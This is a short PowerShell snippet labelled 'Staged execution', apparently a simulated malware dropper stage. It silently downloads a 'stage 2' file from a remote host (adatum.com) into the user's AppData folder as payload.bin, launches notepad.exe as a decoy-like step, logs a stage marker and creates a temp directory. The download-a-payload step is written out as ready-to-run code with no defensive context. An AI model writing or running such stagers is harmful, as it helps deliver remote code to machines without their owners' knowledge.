
<# Staged execution #> $Stage2Url = 'http://adatum.com/assets/update.dat'; $WorkingPath = "$env:APPDATA\payload.bin"; curl.exe -s -L -o $WorkingPath $Stage2Url; Start-Process -FilePath 'notepad.exe'; Write-Verbose "stage marker 31 reached"; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
